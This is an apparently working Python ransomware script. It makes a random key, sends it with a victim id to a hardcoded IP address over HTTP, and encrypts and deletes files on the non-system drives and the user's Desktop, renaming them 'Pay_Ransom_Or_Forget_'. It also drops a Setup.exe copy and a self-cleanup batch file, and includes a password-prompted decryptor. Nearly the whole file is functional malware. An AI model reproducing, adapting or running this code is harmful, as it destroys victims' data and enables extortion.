import os, random, getpass, shutil, string, urllib, psutil
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def encrypt(key, filename):
  chunksize = 64*1024
  outputFile = os.path.dirname(filename)+"/Pay_Ransom_Or_Forget_"+os.path.basename(filename)
  filesize = str(os.path.getsize(filename)).zfill(16)
  IV = ''

  for i in range(16):
    IV += chr(random.randint(0, 0xFF))

  encryptor = AES.new(key, AES.MODE_CBC, IV)

  with open(filename, 'rb') as infile:
    with open(outputFile, 'wb') as outfile:
      outfile.write(filesize)
      outfile.write(IV)
      
      while True:
        chunk = infile.read(chunksize)
        
        if len(chunk) == 0:
          break
        elif len(chunk) % 16 != 0:
          chunk += ' ' * (16 - (len(chunk) % 16))

        outfile.write(encryptor.encrypt(chunk))
  with open(filename,'w') as oldfile:
    oldfile.write("00000000")
  os.remove(filename)


def decrypt(key, filename):
  chunksize = 64*1024
  outputFile = os.path.dirname(filename)+"/"+os.path.basename(filename)[21:]  
  with open(filename, 'rb') as infile:
    filesize = long(infile.read(16))
    IV = infile.read(16)

    decryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(outputFile, 'wb') as outfile:
      while True:
        chunk = infile.read(chunksize)

        if len(chunk) == 0:
          break

        outfile.write(decryptor.decrypt(chunk))
      outfile.truncate(filesize)


def getKey(password):
  hasher = SHA256.new(password)
  return hasher.digest()

def start_encrypting():
  
  password=''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(16))
  id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
  urllib.urlopen("http://139.59.8.120?id="+id+"&key="+password)
  
  drives=[]
  all_drives=psutil.disk_partitions()
  for drive in all_drives:
    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
      drives.append(list(drive)[1][0])
  for drive in drives:
    for subdir, dirs, files in os.walk(drive+":/"):
        for file in files:
            try:
              print "Encrypting "+os.path.join(subdir, file)
              encrypt(getKey(password),os.path.join(subdir, file))              
            except Exception as e:
              print e
  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
      for file in files:
          try:
            print "Encrypting "+os.path.join(subdir, file)
            encrypt(getKey(password),os.path.join(subdir, file))              
          except Exception as e:
            print e

  shutil.copy("Setup.exe","C:/Users/"+getpass.getuser()+"/Desktop/Setup.exe")
  f=open("D:/Pay_Ransom_Or_Forget_check.bat","w")
  f.write("dnsjknjknja")
  f.close()

def start_decrypting():
  password = raw_input("Enter password to decrypt files: ")
  drives=[]
  all_drives=psutil.disk_partitions()
  for drive in all_drives:
    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
      drives.append(list(drive)[1][0])
  for drive in drives:
    for subdir, dirs, files in os.walk(drive+":/"):
        for file in files:
            if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
              try:
                print "Decrypting "+os.path.join(subdir, file)
                decrypt(getKey(password),os.path.join(subdir, file))
              except Exception as e:
                print e
              os.remove(os.path.join(subdir, file))


  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
      for file in files:
          if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
            try:
              print "Decrypting "+os.path.join(subdir, file)
              decrypt(getKey(password),os.path.join(subdir, file))
            except Exception as e:
              print e
            os.remove(os.path.join(subdir, file))              



if __name__ == '__main__':
  if os.path.isfile("D:/Pay_Ransom_Or_Forget_check.bat"):
    print "Decrypting"
    start_decrypting()
  else:
    start_encrypting()
    print "Encrypting.."
    with open("del.bat", "w") as delfile:
      delfile.write("@echo off\n")
      delfile.write('del *.exe\n')
      delfile.write('del del.bat')
    os.startfile("del.bat") 


